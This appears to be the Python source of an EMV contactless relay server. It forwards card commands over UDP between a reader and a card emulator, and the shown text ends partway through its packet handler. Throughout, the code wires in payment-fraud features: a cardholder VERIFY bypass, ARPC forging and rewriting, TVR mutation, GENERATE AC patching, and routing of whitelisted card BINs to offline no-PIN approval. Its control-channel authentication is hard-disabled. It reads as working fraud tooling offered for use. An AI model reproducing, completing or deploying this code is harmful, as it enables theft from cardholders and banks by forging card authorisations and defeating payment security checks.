# -*- coding: utf-8 -*-
#!/usr/bin/env python3


"""
RelayServer - UDP relay with EMV mutations, forge, HMAC auth, rate limiting.
Guard phase machine wired into every mutation/forge/intercept path.
"""

from __future__ import annotations

import base64
import hashlib
import hmac as _hmac_mod
import json
import logging
import os
import secrets
import signal
import socket
import struct
import sys
import time
from collections import deque
from pathlib import Path
from threading import Lock
from typing import Deque, Dict, Optional, Tuple, Any

import guard
import logger
import mutations
import protocol
# ------------------------------------------------------------------
# 1.  Imports from the project
# ------------------------------------------------------------------
import constants
from emv import (
    SessionState, extract_arqc_from_rapdu, cid_indicates_arqc,
    craft_verify_success_bytes, fix_gac_response_length,
    extract_card_cvm_data, parse_cdol1, parse_cvm_list,
)
from guard import Guard, Phase
from logger import configure_logging, _record_apdu, get_apdu_history
from mutations import (
    mutate_gpo_response, mutate_read_record_response,
    mutate_tvr_in_generate_ac_capdu, rewrite_arpc_in_capdu,
    forge_2nd_gac, patch_generate_ac_universal,
)
from tlv import find_tlv
from tp_hub import TPHub

sys.modules.setdefault("rel8hf.protocol", protocol)
sys.modules.setdefault("rel8hf.mutations", mutations)
sys.modules.setdefault("rel8hf.guard", guard)
sys.modules.setdefault("rel8hf.logger", logger)

# Optional crypto dependency for CAPDU signature verification.
try:
    from Crypto.PublicKey import RSA
    from Crypto.Signature import pkcs1_15
    from Crypto.Hash import SHA256

    _HAS_PYCRYPTODOME = True
except Exception:
    RSA = None  # type: ignore[assignment]
    pkcs1_15 = None  # type: ignore[assignment]
    SHA256 = None  # type: ignore[assignment]
    _HAS_PYCRYPTODOME = False

try:
    from mod_emv_synthesizer import EmvSynthesizer

    _HAS_EMV_SYNTH_PLUGIN = True
except Exception:
    EmvSynthesizer = None  # type: ignore[assignment]
    _HAS_EMV_SYNTH_PLUGIN = False

# ------------------------------------------------------------------
# 2.  Bypass engine (the logic that lives in bypasses.py)
# ------------------------------------------------------------------
# The module that implements the patch chain is called *bypasses.py*.
# It does not expose a class; everything is at module level.
# We import it once so the symbols are available to the server.

# ------------------------------------------------------------------
# 3.  TLV helpers - not part of the original code
# ------------------------------------------------------------------
def parse_tlv_flat(data: bytes) -> Dict[str, str]:
    """Parse a flat BER-TLV (no nesting) into a dict of tag->value (hex)."""
    i = 0
    tlvs: Dict[str, str] = {}
    while i < len(data):
        # Tag - we assume single-byte tags in the server code.
        tag = data[i:i + 1].hex().upper()
        i += 1
        # Length
        if data[i] & 0x80:
            num_len = data[i] & 0x7F
            i += 1
            length = int.from_bytes(data[i:i + num_len], 'big')
            i += num_len
        else:
            length = data[i]
            i += 1
        value = data[i:i + length].hex().upper()
        i += length
        tlvs[tag] = value
    return tlvs


def tlv_dict_to_bytes(tlvs: Dict[str, str]) -> bytes:
    """Encode a dict of tag->value (hex) back into flat BER-TLV."""
    out = b''
    for tag, value in tlvs.items():
        tag_bytes = bytes.fromhex(tag)
        val_bytes = bytes.fromhex(value)
        length = len(val_bytes)
        if length < 0x80:
            out += tag_bytes + bytes([length]) + val_bytes
        else:
            len_bytes = length.to_bytes((length.bit_length() + 7) // 8, 'big')
            out += tag_bytes + bytes([0x80 | len(len_bytes)]) + len_bytes + val_bytes
    return out

# ------------------------------------------------------------------
# 4.  Logger
# ------------------------------------------------------------------
log = logging.getLogger("RelayServer")
CTRL_HMAC_DISABLED = True

CARD_PRESENT_PREFIXES: Tuple[str, ...] = (
    "CARD_PRESENT",
    "CARD PRESENT",
    "##CARD_PRESENT",
    "!CARD_PRESENT",
    "CARD_INSERTED",
    "CARD_TAPPED",
    "CARD_ATTACHED",
    "TAG_DISCOVERED",
    "TAG DISCOVERED",
    "TAG_PRESENT",
)

CARD_REMOVED_PREFIXES: Tuple[str, ...] = (
    "CARD_REMOVED",
    "CARD REMOVED",
    "##CARD_REMOVED",
    "!CARD_REMOVED",
    "CARD_DETACHED",
    "CARD_NOT_PRESENT",
    "CARD_ABSENT",
    "##READER_DEVICE_NOT_AVAILABLE",
    "READER_DEVICE_NOT_AVAILABLE",
    "TAG_LOST",
    "TAG LOST",
    "##TAG_LOST",
    "CARD_LOST",
    "CARD LOST",
)

MGMT_PREFIXES: Tuple[str, ...] = (
    "STATUS",
    "DUMP_STATE",
    "DUMP_LAST",
    "VERIFY_BYPASS",
    "ARPC_FORGE",
    "ARPC_REWRITE",
    "TVR_MUTATE",
) + CARD_PRESENT_PREFIXES + CARD_REMOVED_PREFIXES


def _starts_with_any(command: str, prefixes: Tuple[str, ...]) -> bool:
    return command.startswith(prefixes)

# ------------------------------------------------------------------
# 4.1  Production card router 
# ------------------------------------------------------------------
class ProductionCardRouter:
    """
    Lightweight routing intent helper:
    - prefers offline NoCVM for known BINs when context permits
    - otherwise marks session as ONLINE fallback
    """
    def __init__(self) -> None:
        self.offline_nocvm_bins = {
            "520082", "414720", "601100", "371234", "371235",
            "434256", "542418", "650000",
            "400000", "400001", "400002", "400003", "400004", "400005", "400006", "400007",
            "400008", "400009", "400010", "400011", "400012", "400013", "400014", "400015",
            "400016", "400017", "400018", "400019", "400020", "400021", "400022", "400023",
            "400024", "400025", "400026", "400027", "400028", "400029", "400030", "400031",
            "410000", "410001", "410002", "410003", "410004", "410005", "410006", "410007",
            "410008", "410009", "410010", "410011", "410012", "410013", "410014", "410015",
            "510000", "510001", "510002", "510003", "510004", "510005", "510006", "510007",
            "510008", "510009", "510010", "510011", "510012", "510013", "510014", "510015",
        }
        self.limit_map: Dict[str, int] = {}

    @staticmethod
    def _ctq_forces_online_pin(ctq: Optional[bytes], mode: str = "OFFLINE_NOCVM") -> bool:
        if not ctq:
            return False
        mode_u = (mode or "").upper()
        index = 0 if mode_u == "OFFLINE_NOCVM" else 1
        if len(ctq) <= index:
            return False
        return bool(ctq[index] & 0x80)

    def decide(
        self,
        *,
        pan_bin: Optional[str],
        amount_cents: int,
        floor_limit_cents: int,
        ctq: Optional[bytes],
    ) -> Dict[str, Any]:
        if not pan_bin or len(pan_bin) != 6 or not pan_bin.isdigit():
            return {"mode": "ONLINE", "reason": "bin_missing", "max_amount": 0}
        if pan_bin not in self.offline_nocvm_bins:
            return {"mode": "ONLINE", "reason": "bin_not_whitelisted", "max_amount": 0}
        if self._ctq_forces_online_pin(ctq, "OFFLINE_NOCVM"):
            return {"mode": "ONLINE", "reason": "ctq_forces_online_pin", "max_amount": 0}
        mapped = self.limit_map.get(pan_bin, floor_limit_cents)
        effective_limit = min(floor_limit_cents, mapped)
        if amount_cents > effective_limit:
            return {"mode": "ONLINE", "reason": "amount_over_limit", "max_amount": effective_limit}
        return {"mode": "OFFLINE_NOCVM", "reason": "offline_nocvm_ok", "max_amount": effective_limit}

# ------------------------------------------------------------------
# 5.  RelayServer class
# ------------------------------------------------------------------
class RelayServer:
    """
    UDP relay that sits between a reader and an emulator.
    Implements the EMV transaction flow, the guard, the packet router,
    and the bypass engine.
    """

    # ------------------------------------------------------------------
    # 5.1  Constants (from Server A)
    # ------------------------------------------------------------------
    SESSION_BEGIN_RATE_LIMIT = 1.0          # seconds - how often a new session can be requested
    SESSION_BEGIN_BURST   = 3              # number of requests allowed in a burst
    SESSION_TOKEN_TTL_SECONDS = 120.0       # replay protection window for SESSION_BEGIN tokens
    CAPDU_RETRY_MIN_INTERVAL = 0.15         # seconds - minimal time between re-transmits
    CAPDU_RETRY_MAX   = 2                   # max number of re-transmit attempts
    CAPDU_TIMEOUT = 30.0                    # seconds - pending CAPDU timeout
    CARD_EVENT_DEBOUNCE_DEFAULT_SECONDS = 0.35

    # ------------------------------------------------------------------
    # 5.2  Construction
    # ------------------------------------------------------------------
    def __init__(self, host: str = "0.0.0.0", port: int = 5566) -> None:
        self.host = host
        self.port = port
        self.sock: Optional[socket.socket] = None
        self.running = False
        self._shutdown_requested = False
        self.full_output_enabled = os.environ.get(
            "RELAY_FULL_OUTPUT", "1"
        ).strip().lower() not in {"0", "false", "no", "off"}
        self.outcome_guard_enabled = os.environ.get(
            "RELAY_OUTCOME_GUARD", "1"
        ).strip().lower() not in {"0", "false", "no", "off"}
        self.gpo_force_success_enabled = os.environ.get(
            "RELAY_GPO_FORCE_SUCCESS", "0"
        ).strip().lower() in {"1", "true", "yes", "on"}
        self.guard_verbose = os.environ.get(
            "RELAY_GUARD_VERBOSE", "1"
        ).strip().lower() not in {"0", "false", "no", "off"}
        # 2000 currency units default (in cents) unless caller overrides.
        self.policy_amount_cents = int(os.environ.get("RELAY_POLICY_AMOUNT_CENTS", "200000"))
        self.capdu_sig_verify_enabled = os.environ.get(
            "RELAY_CAPDU_SIG_VERIFY", "0"
        ).strip().lower() in {"1", "true", "yes", "on"}
        self.capdu_sig_strip = os.environ.get(
            "RELAY_CAPDU_SIG_STRIP", "1"
        ).strip().lower() not in {"0", "false", "no", "off"}
        self.capdu_sig_pubkey_path = os.environ.get(
            "RELAY_CAPDU_SIG_PUBKEY", "/root/split/keys/public.pem"
        ).strip()
        self.synth_plugin_enabled = os.environ.get(
            "RELAY_SYNTH_PLUGIN_ENABLED", "0"
        ).strip().lower() in {"1", "true", "yes", "on"}
        try:
            self.synth_amount = max(0, int(os.environ.get("RELAY_SYNTH_AMOUNT", "0")))
        except Exception:
            self.synth_amount = 0
        try:
            self.synth_currency_code = max(0, int(os.environ.get("RELAY_SYNTH_CURRENCY_CODE", "978")))
        except Exception:
            self.synth_currency_code = 978
        try:
            self.synth_country_code = max(0, int(os.environ.get("RELAY_SYNTH_COUNTRY_CODE", "250")))
        except Exception:
            self.synth_country_code = 250
        self._capdu_sig_verifier_available = False
        self._capdu_sig_public_key = None
        self.allow_single_peer_session = os.environ.get(
            "RELAY_ALLOW_SINGLE_PEER_SESSION", "0"
        ).strip().lower() in {"1", "true", "yes", "on"}
        try:
            self.card_event_debounce_seconds = max(
                0.0,
                min(5.0, float(os.environ.get("RELAY_CARD_EVENT_DEBOUNCE", str(self.CARD_EVENT_DEBOUNCE_DEFAULT_SECONDS)))),
            )
        except Exception:
            self.card_event_debounce_seconds = self.CARD_EVENT_DEBOUNCE_DEFAULT_SECONDS

        # Peers
        self.reader_addr: Optional[Tuple[str, int]] = None
        self.emulator_addr: Optional[Tuple[str, int]] = None
        self.reader_last_seen: float = 0.0
        self.emulator_last_seen: float = 0.0
        self.reader_id: Optional[str] = None
        self.emulator_id: Optional[str] = None

        # Session bookkeeping
        self.active_epoch: int = 0
        self._incoming_epoch: int = 0
        self._session_requests: Dict[Tuple[Tuple[str, int], str], int] = {}
        self._session_begin_timestamps: Dict[Tuple[str, int], Deque[float]] = {}
        self._session_token_seen: Dict[Tuple[Tuple[str, int], str], Tuple[int, float]] = {}
        self._session_token_global_seen: Dict[str, Tuple[int, Tuple[str, int], float]] = {}
        self._peer_versions: Dict[Tuple[str, int], int] = {}
        self._last_card_event_kind: Optional[str] = None
        self._last_card_event_ts: float = 0.0

        # Pending CAPDU - duplicate detection & retransmission
        self._pending_source_capdu: Optional[bytes] = None
        self._pending_forward_time: float = 0.0
        self._pending_forward_retries: int = 0
        self._pending_timeout_ts: float = 0.0

        # State + guard
        self.state = SessionState()
        self.guard = Guard()
        self.lock = Lock()

        # Optional packet-router
        self._packet_router = None
        try:
            import packet_router
            self._packet_router = packet_router
        except Exception:
            pass

        # ------------------------------------------------------------------
        # 5.3  UDP rate-limit state (per-endpoint token bucket)
        # ------------------------------------------------------------------
        # Maps (ip, port) -> (last-token-time, token-count)
        # The bucket starts full (UDP_RATE_BURST tokens).
        self._udp_rate_state: Dict[Tuple[str, int], Tuple[float, float]] = {}

        # ------------------------------------------------------------------
        # 5.4  Last completed exchange (CAPDU + RAPDU) - duplicate replay
        # ------------------------------------------------------------------
        self._last_exchange: Optional[Tuple[int, int, bytes, bytes]] = None
        self._card_bin: Optional[str] = None
        self._ctq_value: Optional[bytes] = None
        self._floor_limit_cents: int = 0x7FFFFFFFFFFFFFFF
        self._router = ProductionCardRouter()
        self._tp_hub = TPHub.from_env()
        self._init_capdu_signature_verifier()
        self._synth_pdol_schema: Optional[bytes] = None
        self._synth_plugin: Optional[EmvSynthesizer] = None
        if self.synth_plugin_enabled:
            if _HAS_EMV_SYNTH_PLUGIN and EmvSynthesizer is not None:
                self._synth_plugin = EmvSynthesizer(
                    amount=self.synth_amount,
                    currency_code=self.synth_currency_code,
                    country_code=self.synth_country_code,
                )
                log.info(
                    "[SYNTH] plugin enabled amount=%s currency=%s country=%s",
                    self.synth_amount,
                    self.synth_currency_code,
                    self.synth_country_code,
                )
            else:
                self.synth_plugin_enabled = False
                log.warning("[SYNTH] plugin requested but mod_emv_synthesizer import failed; disabling")

        # ------------------------------------------------------------------
        # 5.5  Card state health tracking
        # ------------------------------------------------------------------
        self._card_crypto_failure_count: int = 0
        self._card_record_failure_count: int = 0
        self._card_last_failure_phase: Optional[str] = None
        # Single-writer rule for GENERATE AC mutation path:
        # AUTO -> UNIVERSAL (preferred) or LEGACY (fallback) chosen once/session.
        self._gac_mutation_leader: str = "AUTO"
        self.metrics: Dict[str, int] = {
            "packets_received": 0,
            "malformed_frames_total": 0,
            "unframed_ctrl_alias_total": 0,
            "unframed_quarantine_total": 0,
            "card_events_debounced_total": 0,
            "card_events_rejected_source_total": 0,
            "session_begin_peer_not_ready_total": 0,
        }

    def _guard_log(self, message: str, *, blocked: bool = False) -> None:
        if not self.guard_verbose and not blocked:
            return
        if blocked:
            log.warning(f"[GUARD] {message}")
        else:
            log.info(f"[GUARD] {message}")

    def _metric_inc(self, key: str, delta: int = 1) -> None:
        self.metrics[key] = int(self.metrics.get(key, 0)) + int(delta)

    def _capture_synth_pdol_schema(self, rapdu: bytes) -> None:
        if not self.synth_plugin_enabled:
            return
        if len(rapdu) < 2 or rapdu[-2:] != constants.SW_9000:
            return
        pdol = find_tlv(rapdu[:-2], 0x9F38)
        self._synth_pdol_schema = pdol
        if pdol:
            log.info(f"[SYNTH] captured PDOL schema len={len(pdol)}")

    def _apply_synth_plugin(self, capdu: bytes) -> bytes:
        if not self.synth_plugin_enabled or self._synth_plugin is None:
            return capdu
        if not constants.is_gpo(capdu):
            return capdu
        if not self._synth_pdol_schema:
            return capdu
        try:
            synthesized = self._synth_plugin.build_gpo_apdu(self._synth_pdol_schema)
        except Exception as exc:
            log.error(f"[SYNTH] CAPDU rewrite failed: {exc}")
            return capdu
        if synthesized != capdu:
            log.info(
                "[SYNTH] GPO CAPDU rewritten using captured PDOL (%s -> %s bytes)",
                len(capdu),
                len(synthesized),
            )
        return synthesized

    def _init_capdu_signature_verifier(self) -> None:
        if not self.capdu_sig_verify_enabled:
            return
        if not _HAS_PYCRYPTODOME:
            log.error("CAPDU signature verify requested but PyCryptodome is unavailable; disabling verify")
            self.capdu_sig_verify_enabled = False
            return
        try:
            key_bytes = Path(self.capdu_sig_pubkey_path).read_bytes()
            self._capdu_sig_public_key = RSA.import_key(key_bytes)  # type: ignore[union-attr]
            self._capdu_sig_verifier_available = True
        except Exception as exc:
            log.error(
                f"CAPDU signature verify requested but public key load failed ({self.capdu_sig_pubkey_path}): {exc}"
            )
            self.capdu_sig_verify_enabled = False

    @staticmethod
    def _extract_capdu_signature_tail(data: bytes) -> Tuple[bytes, Optional[bytes]]:
        """
        Return (unsigned_payload, signature) when payload ends with TLV 9F45.
        If no valid tail TLV is present, returns (data, None).
        """
        tag = b"\x9F\x45"
        search_to = len(data)
        while True:
            idx = data.rfind(tag, 0, search_to)
            if idx < 0:
                return data, None
            len_off = idx + 2
            if len_off >= len(data):
                search_to = idx
                continue
            first_len = data[len_off]
            if first_len < 0x80:
                len_len = 1
                value_len = first_len
            else:
                n = first_len & 0x7F
                if n == 0 or n > 4 or len_off + 1 + n > len(data):
                    search_to = idx
                    continue
                len_len = 1 + n
                value_len = int.from_bytes(data[len_off + 1 : len_off + 1 + n], "big")
            header_len = 2 + len_len
            total_len = header_len + value_len
            if idx + total_len != len(data):
                search_to = idx
                continue
            sig = data[idx + header_len :]
            if not sig:
                search_to = idx
                continue
            return data[:idx], sig

    def _verify_generate_ac_signature(self, payload: bytes) -> Tuple[bool, bytes, str]:
        if not self.capdu_sig_verify_enabled:
            return True, payload, "disabled"
        if not self._capdu_sig_verifier_available or self._capdu_sig_public_key is None:
            return False, payload, "verifier_unavailable"
        unsigned_payload, signature = self._extract_capdu_signature_tail(payload)
        if signature is None:
            return False, payload, "signature_missing"
        try:
            digest = SHA256.new(unsigned_payload)  # type: ignore[union-attr]
            pkcs1_15.new(self._capdu_sig_public_key).verify(digest, signature)  # type: ignore[union-attr]
        except Exception:
            return False, payload, "signature_invalid"
        if self.capdu_sig_strip:
            return True, unsigned_payload, "ok_strip"
        return True, payload, "ok_keep"

    # ------------------------------------------------------------------
    # 5.5  Startup / shutdown
    # ------------------------------------------------------------------
    def start(self) -> None:
        if self.running:
            raise RuntimeError("RelayServer is already running")
        configure_logging()
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, constants.UDP_SOCKET_BUFFER)
            self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, constants.UDP_SOCKET_BUFFER)
            self.sock.bind((self.host, self.port))
            self.sock.settimeout(constants.SOCKET_TIMEOUT)
            self.running = True
            self._sync_router_transport()
            log.info(f"RelayServer listening on {self.host}:{self.port}")
            if self.full_output_enabled:
                log.info("Full output trace: ENABLED (CAPDU/RAPDU hex dump)")
            if self.capdu_sig_verify_enabled:
                mode = "strip-9F45" if self.capdu_sig_strip else "forward-9F45"
                log.info(
                    f"CAPDU signature verify: ENABLED ({mode}, key={self.capdu_sig_pubkey_path})"
                )
            log.info(f"VERIFY bypass:  {'ENABLED' if self.state.verify_bypass_enabled else 'DISABLED'}")
            log.info(f"ARPC forge:     {'ENABLED' if self.state.arpc_forge_enabled else 'DISABLED'}")
            log.info(f"ARPC rewrite:   {'ENABLED' if self.state.arpc_rewrite_enabled else 'DISABLED'}")
            log.info(f"TVR mutation:   {'ENABLED' if self.state.tvr_mutation_enabled else 'DISABLED'}")
            log.info("CTRL HMAC auth: DISABLED (hard-disabled)")
            log.info(f"Guard phase:    {self.guard.phase.name}")
            timeout_label = (f"{constants.PEER_TIMEOUT_SECONDS:g}s"
                             if constants.PEER_TIMEOUT_SECONDS > 0 else "DISABLED")
            log.info(f"Peer timeout:   {timeout_label}")
            self._log_connected_devices("startup")
            self._run_loop()
        finally:
            self.stop()

    def stop(self) -> None:
        was_active = self.running or self.sock is not None
        self.running = False
        if self.sock:
            for peer in (self.reader_addr, self.emulator_addr):
                if peer:
                    self._send_ctrl_response(peer, "SERVER_SHUTDOWN")
        sock, self.sock = self.sock, None
        if sock:
            try:
                sock.close()
            except OSError as e:
                log.debug(f"Socket close failed: {e}")
        self._sync_router_transport()
        if was_active:
            log.info("RelayServer stopped")

    # ------------------------------------------------------------------
    # 5.6  Main event loop
    # ------------------------------------------------------------------
    def _run_loop(self) -> None:
        last_activity = time.time()
        stall_warned = False
        maintenance_interval = max(0.1, constants.SOCKET_TIMEOUT)
        next_maintenance = time.monotonic() + maintenance_interval
        while self.running:
            if self._shutdown_requested:
                log.info("Shutdown flag set, exiting run loop")
                self.running = False
                break
            try:
                data, addr = self.sock.recvfrom(constants.RECV_BUFFER)
                try:
                    if self._handle_packet(data, addr):
                        last_activity = time.time()
                        stall_warned = False
                except Exception as e:
                    log.error(f"Packet handler failed for {addr}: {e}", exc_info=True)
                now = time.monotonic()
                if now >= next_maintenance:
                    stall_warned = self._run_maintenance(last_activity, stall_warned)
                    next_maintenance = now + maintenance_interval
            except socket.timeout:
                if self._shutdown_requested:
                    log.info("Shutdown flag set during timeout, exiting")
                    self.running = False
                    break
                stall_warned = self._run_maintenance(last_activity, stall_warned)
                next_maintenance = time.monotonic() + maintenance_interval
                continue
            except OSError as e:
                if self.running:
                    log.error(f"Socket error: {e}")
                break

    # ------------------------------------------------------------------
    # 5.7  Maintenance - timeouts, peer cleanup
    # ------------------------------------------------------------------
    def _run_maintenance(self, last_activity: float, stall_warned: bool) -> bool:
        """Periodically run housekeeping: peer timeouts, pending CAPDU timeout, etc."""
        self._check_peer_timeouts()
        # Pending CAPDU timeout
        if self.state.pending_exchange_id is not None:
            if time.monotonic() - self._pending_timeout_ts > self.CAPDU_TIMEOUT:
                log.warning(f"Pending CAPDU timeout (exchange {self.state.pending_exchange_id})")
                self._reset_pending_state()
        # Stall warning
        if self.state.selected_aid is not None:
            elapsed = time.time() - last_activity
            if elapsed > constants.STALL_WARN_SECONDS and not stall_warned:
                log.warning(
                    f"[STALL] No APDU activity for {elapsed:.1f}s "
                    f"(brand={self.state.brand}, second_ae_pending={self.state.second_ae_pending}, "
                    f"reason={self.state.second_ae_reason})"
                )
                stall_warned = True
        return stall_warned

    # ------------------------------------------------------------------
    # 5.8  Peer timeout handling
    # ------------------------------------------------------------------
    def _check_peer_timeouts(self) -> None:
        if constants.PEER_TIMEOUT_SECONDS <= 0:
            return
        now = time.time()
        reset_reason = None
        membership_changed = False
        if self.reader_addr and (now - self.reader_last_seen) > constants.PEER_TIMEOUT_SECONDS:
            log.warning(f"Reader {self.reader_addr} timed out")
            self._peer_versions.pop(self.reader_addr, None)
            self.reader_addr = None
            self.reader_id = None
            reset_reason = "reader timeout"
            membership_changed = True
        if self.emulator_addr and (now - self.emulator_last_seen) > constants.PEER_TIMEOUT_SECONDS:
            log.warning(f"Emulator {self.emulator_addr} timed out")
            self._peer_versions.pop(self.emulator_addr, None)
            self.emulator_addr = None
            self.emulator_id = None
            reset_reason = "emulator timeout"
            membership_changed = True
        if reset_reason:
            self._reset_session(reset_reason, unlock_epoch=True)
        if membership_changed:
            self._log_connected_devices("peer timeout")
        stale = [addr for addr in self._peer_versions
                 if addr != self.reader_addr and addr != self.emulator_addr]
        for addr in stale:
            del self._peer_versions[addr]
        self._sync_router_transport()

    # ------------------------------------------------------------------
    # 5.9  Session reset
    # ------------------------------------------------------------------
    def _reset_session(self, reason: str, unlock_epoch: bool = False) -> None:
        with self.lock:
            self.state.reset()
            self.guard.reset()
            self._reset_pending_state()
            if unlock_epoch:
                self.active_epoch = 0
                self.active_session_token = None
                self._session_requests.clear()
                self._session_token_seen.clear()
                self._session_token_global_seen.clear()
            self._last_card_event_kind = None
            self._last_card_event_ts = 0.0
            if self._packet_router:
                try:
                    self._packet_router.reset_session()
                except Exception as e:
                    log.debug(f"packet_router.reset_session failed: {e}")
            self._card_crypto_failure_count = 0
            self._card_record_failure_count = 0
            self._card_last_failure_phase = None
            self._gac_mutation_leader = "AUTO"
            self._latest_rapdu = None
            self._synth_pdol_schema = None
            if hasattr(self, "_exchange_cv") and self._exchange_cv is not None:
                self._exchange_cv.notify_all()
        log.info(f"Session reset ({reason}) - seq={self.state.seq} guard={self.guard.phase.name}")

    def _restart_emv_flow(self, reason: str) -> None:
        """
        Soft restart of EMV phase ordering inside the current peer/session binding.
        Used when a terminal starts a fresh PPSE SELECT after partial/failed flow.
        """
        with self.lock:
            self.state.reset()
            self.guard.reset()
            self._reset_pending_state()
            self._gac_mutation_leader = "AUTO"
            self._latest_rapdu = None
            self._synth_pdol_schema = None
            if hasattr(self, "_exchange_cv") and self._exchange_cv is not None:
                self._exchange_cv.notify_all()
        log.info(f"EMV flow restart ({reason}) - seq={self.state.seq} guard={self.guard.phase.name}")

    # ------------------------------------------------------------------
    # 5.10  Pending state helpers
    # ------------------------------------------------------------------
    def _reset_pending_state(self) -> None:
        self.state.pending_capdu = None
        self.state.pending_exchange_id = None
        self._pending_source_capdu = None
        self._pending_forward_time = 0.0
        self._pending_forward_retries = 0
        self._pending_timeout_ts = 0.0

    # ------------------------------------------------------------------
    # 5.11  Transport state sync
    # ------------------------------------------------------------------
    def _sync_router_transport(self) -> None:
        if not self._packet_router:
            return
        try:
            self._packet_router.set_transport_state(
                sock=self.sock,
                reader_addr=self.reader_addr,
                emulator_addr=self.emulator_addr,
            )
        except Exception as e:
            log.warning(f"Packet router disabled after transport sync failure: {e}")
            self._packet_router = None

    # ------------------------------------------------------------------
    # 5.12  Router mutation active?
    # ------------------------------------------------------------------
    def _router_mutation_active(self) -> bool:
        if not self._packet_router:
            return False
        try:
            return self._packet_router.get_mode() != self._packet_router.MODE_PASSTHROUGH
        except Exception as e:
            log.warning(f"Packet router disabled after mode query failure: {e}")
            self._packet_router = None
            return False

    # ------------------------------------------------------------------
    # 5.13  Frame helpers
    # ------------------------------------------------------------------
    def _send_frame(self, addr: Tuple[str, int], sid: int, payload: bytes) -> bool:
        seq = 0
        if sid in (constants.SID_CAPDU, constants.SID_RAPDU):
            exchange_id, payload = constants.parse_exchange_payload(payload)
            if exchange_id is not None:
                seq = exchange_id
        frame = constants.build_frame(sid, payload, seq, self.active_epoch)
        if len(frame) > constants.MAX_FRAME_SIZE:
            log.warning(f"Frame to {addr} rejected: {len(frame)} > {constants.MAX_FRAME_SIZE}")
            return False
        try:
            self.sock.sendto(frame, addr)
            return True
        except OSError as e:
            log.warning(f"Send to {addr} failed: {e}")
            return False

    def _send_ack(self, addr: Tuple[str, int], kind: str) -> None:
        self._send_frame(addr, constants.SID_ACK, kind.encode("ascii"))

    def _send_ctrl_response(self, addr: Tuple[str, int], text: str) -> bool:
        return self._send_ctrl_bytes(addr, text.encode())

    def _send_ctrl_bytes(self, addr: Tuple[str, int], payload: bytes) -> bool:
        if len(payload) <= constants.MAX_FRAME_PAYLOAD:
            return self._send_frame(addr, constants.SID_CTRL, payload)
        request_id = f"{time.time_ns():x}"
        chunks = [payload[i:i + constants.CTRL_CHUNK_RAW_SIZE]
                  for i in range(0, len(payload), constants.CTRL_CHUNK_RAW_SIZE)]
        total = len(chunks)
        sent_all = True
        for index, chunk in enumerate(chunks, 1):
            if not self._send_frame(
                addr,
                constants.SID_CTRL,
                f"CHUNK {request_id} {index} {total} ".encode("ascii")
                + base64.b64encode(chunk),
            ):
                sent_all = False
        return sent_all

    # ------------------------------------------------------------------
    # 5.14  HMAC helpers
    # ------------------------------------------------------------------
    def _ctrl_compute_hmac(self, epoch: int, seq: int, payload: bytes) -> bytes:
        if CTRL_HMAC_DISABLED:
            return b""
        if constants.CTRL_HMAC_KEY is None:
            return b""
        msg = struct.pack(">IH", epoch & 0xFFFFFFFF, seq & 0xFFFF) + payload
        return _hmac_mod.new(constants.CTRL_HMAC_KEY, msg, hashlib.sha256).digest()

    def _ctrl_verify_hmac(self, payload: bytes, epoch: int, seq: int) -> Tuple[bytes, bool]:
        if CTRL_HMAC_DISABLED:
            return payload, True
        if constants.CTRL_HMAC_KEY is None:
            return payload, True
        if len(payload) < constants.CTRL_HMAC_DIGEST_SIZE:
            return payload, False
        body = payload[:-constants.CTRL_HMAC_DIGEST_SIZE]
        received_mac = payload[-constants.CTRL_HMAC_DIGEST_SIZE:]
        expected_mac = self._ctrl_compute_hmac(epoch, seq, body)
        if _hmac_mod.compare_digest(received_mac, expected_mac):
            return body, True
        return body, False

    # ------------------------------------------------------------------
    # 5.15  Packet processing
    # ------------------------------------------------------------------
    def _handle_packet(self, data: bytes, addr: Tuple[str, int]) -> bool:
        self._metric_inc("packets_received")
        if not self._udp_rate_ok(addr):
            log.debug(f"UDP rate limit exceeded for {addr}")
            return False

        if data.startswith(b"TP_JSON "):
            try:
                body = data[8:]
                payload = json.loads(body.decode("utf-8", errors="strict"))
                terminal_caps = payload.get("terminal_capabilities", {}) if isinstance(payload, dict) else {}
                if terminal_caps:
                    self._tp_hub.enabled = bool(payload.get("recommendation", {}).get("tp_enabled", True))
                    self._tp_hub.feed(terminal_caps)
                    self._tp_hub.last_hint = payload.get("recommendation")
                    log.info(f"[TP-HUB] received terminal probe recommendation: {payload.get('recommendation', {}).get('policy_mode', 'AUTO')}")
                    return False
            except Exception:
                log.warning(f"TP JSON from {addr} was malformed; ignored")
                return False

        parsed = constants.parse_frame(data)
        if parsed is None:
            # Check for plain text control commands without binary frame header
            try:
                text_cmd = data.decode("utf-8", errors="ignore").strip("\x00 \r\n\t").upper()
                if _starts_with_any(text_cmd, CARD_PRESENT_PREFIXES):
                    self._metric_inc("unframed_ctrl_alias_total")
                    self._incoming_epoch = 0
                    self._handle_ctrl(b"CARD_PRESENT", addr)
                    return False
                if _starts_with_any(text_cmd, CARD_REMOVED_PREFIXES):
                    self._metric_inc("unframed_ctrl_alias_total")
                    self._incoming_epoch = 0
                    self._handle_ctrl(b"CARD_REMOVED", addr)
                    return False
            except Exception:
                pass
            self._metric_inc("malformed_frames_total")
            self._metric_inc("unframed_quarantine_total")
            log.warning(f"Malformed/unframed packet quarantined from {addr}: {data[:16].hex()}...")
            return False
        sid, epoch, seq, payload = parsed
        self._incoming_epoch = epoch
        if sid in (constants.SID_CAPDU, constants.SID_RAPDU):
            if addr not in (self.reader_addr, self.emulator_addr):
                if self.reader_addr is None and addr != self.emulator_addr:
                    self.reader_addr = addr
                    self.reader_last_seen = time.time()
                    log.info(f"\033[92mDEVICE CONNECTED role=READER address={addr[0]}:{addr[1]} id=auto-assigned protocol=V1\033[0m")
                elif self.emulator_addr is None and addr != self.reader_addr:
                    self.emulator_addr = addr
                    self.emulator_last_seen = time.time()
                    log.info(f"\033[92mDEVICE CONNECTED role=EMULATOR address={addr[0]}:{addr[1]} id=auto-assigned protocol=V1\033[0m")
                else:
                    log.warning(f"APDU frame from unregistered address {addr} dropped")
                    return False
            if self.active_epoch != 0 and epoch != 0 and epoch != self.active_epoch:
                log.warning(
                    f"Stale/uninitialized epoch from {addr}: "
                    f"got={epoch} active={self.active_epoch}"
                )
                self._send_ctrl_response(addr, f"ERR STALE_EPOCH ACTIVE={self.active_epoch}")
                return False
            payload = constants.build_exchange_payload(seq, payload)
        self._touch_peer(addr)
